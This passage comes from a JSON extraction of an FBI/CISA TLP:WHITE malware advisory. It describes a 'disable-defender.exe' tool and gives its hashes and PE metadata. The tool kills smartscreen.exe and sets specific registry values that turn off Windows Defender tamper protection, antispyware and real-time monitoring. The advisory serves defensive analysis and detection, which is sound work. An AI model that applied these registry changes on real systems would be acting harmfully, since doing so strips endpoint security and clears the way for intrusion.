+  "text": "TLP:WHITE                                                                                             FBI | CISA"
+ },
+ {
+  "id": "p94",
+  "text": "Test validate permissions\n       The application will attempt to terminate the Windows Defender process by calling TerminateProcess\n       for smartscreen.exe:"
+ },
+ {
+  "id": "p95",
+  "text": "Attempt to kill Windows Defender\n       The following Registry Keys were modified to disable Windows Defender:\n        Set Registry Values (observed Win10 1709)\n        HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection             0"
+ },
+ {
+  "id": "p96",
+  "text": "TLP:WHITE                                                                                                   FBI | CISA"
+ },
+ {
+  "id": "p97",
+  "text": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware              1\n        HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\                          03 00 00 00 5D\n        StartupApproved\\Run\\SecurityHealth                                                02 00 00 41 3B\n                                                                                          47 9D\n        HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware                       1\n        HKLM\\System\\CurrentControlSet\\Services\\WinDefend\\Start                            3\n        HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\                    1\n        DisableRealtimeMonitoring"
+ },
+ {
+  "id": "p98",
+  "text": "Upon completion and if successful the application will display the following messages and wait for\n       user input."
+ },
+ {
+  "id": "p99",
+  "text": "User input\n        disable-defender.exe\n        File Size                       292.0 KB (299008 bytes)\n        SHA256                          45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0\n                                        915ace\n        SHA1                            e866cc6b1507f21f688ecc2ef15a64e413743da7\n        MD5                             60afb1e62ac61424a542b8c7b4d2cf01\n        SSDeep                          6144:t2WhikbJZc+Wrbe/t1zT/p03BuGJ1oh7ISCLun:t2WpZnW+/tVoJ1\n                                        ouQ (Ver 1.1)\n        Filetype                        PE32+ executable (console) x86-64, for MS Windows\n        PEtype                          EXE\n        PE Header Timestamp             2021-10-24 15:07:32"
+ },
+ {
+  "id": "p100",
+  "text": "ImpHash                         74a6ef9e7b49c71341e439022f643c8e"
+ }
+]
